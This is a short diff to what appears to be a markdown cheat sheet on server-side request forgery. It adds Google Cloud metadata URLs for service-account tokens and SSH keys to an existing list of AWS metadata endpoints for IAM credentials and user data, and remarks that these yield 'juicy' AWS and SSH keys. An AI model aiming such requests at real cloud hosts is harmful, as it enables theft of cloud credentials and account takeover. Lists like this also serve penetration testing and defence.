@@ -173,3 +173,33 @@ It is an application protocol used over an IP network to manage and access the d
     http://169.254.169.254/latest/user-data/
     http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_HERE
     http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
+    
+ This will give our juicy information like Aws keys, ssh keys and more
+ 
+ 
+## Google Cloud -
+
+  Same for google
+  
+     http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
+     http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
